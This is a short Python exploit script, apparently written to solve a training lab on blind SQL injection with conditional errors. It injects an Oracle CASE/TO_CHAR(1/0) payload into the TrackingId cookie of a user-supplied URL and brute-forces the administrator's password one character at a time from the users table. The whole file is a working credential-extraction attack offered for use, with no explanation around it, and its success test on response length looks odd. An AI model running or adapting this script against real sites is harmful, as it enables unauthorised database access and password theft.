#Blind SQL injection with conditional errors
import requests
import os
import json
import re
url = input("enter url : ")
r=requests.get(url)
cookies = r.cookies.get_dict()

TrackingId = cookies['TrackingId']
Password = "password : "
for i in range(1,20) :
    for j in 'abcdefghijklmnopqrstuvwxyz0123456789':
              
              
     cookies['TrackingId'] = TrackingId+"'||(SELECT CASE WHEN  SUBSTR(password,"+str(i)+",1)='"+j+"' THEN TO_CHAR(1/0)  ELSE 'a' END  FROM users WHERE username='administrator')||'" 
     r=requests.get(url,cookies=cookies)
     if len(r.content) == 21 :
         Password=Password+j

print(Password)

